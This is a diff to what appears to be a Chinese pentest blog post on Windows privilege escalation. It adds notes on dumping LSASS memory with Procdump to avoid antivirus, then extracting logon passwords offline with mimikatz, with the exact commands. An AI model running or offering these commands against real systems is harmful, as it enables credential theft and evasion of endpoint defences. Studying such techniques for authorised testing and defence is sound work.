@@ -49,6 +49,14 @@ topics = ["Pentest"]
 ![得到密码1](/img/post/privilge_escalation_win_getpass1.png)
 ![得到密码2](/img/post/privilge_escalation_win_getpass2.png)
 
+* 导出hash本地得到密码  
+    若mimikatz和getpass这类软件被杀的话可以先用Procdump导出lsass.dmp，然后本地用mimikatz解密，Procdump是微软官方的软件，应该不会被杀
+    * 上传Procdump.exe导出文件  
+        Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+    * 下载lsass.dmp后用本地mimikatz解密  
+        先输入：mimikatz.exe "sekurlsa::minidump lsass.dmp"  
+        后输入：sekurlsa::logonpasswords
+
 ### 0x02 开启3389
 * 直接使用注册表
 ![新建开3389的注册表](/img/post/privilge_escalation_win_new_file_3389_reg.png)
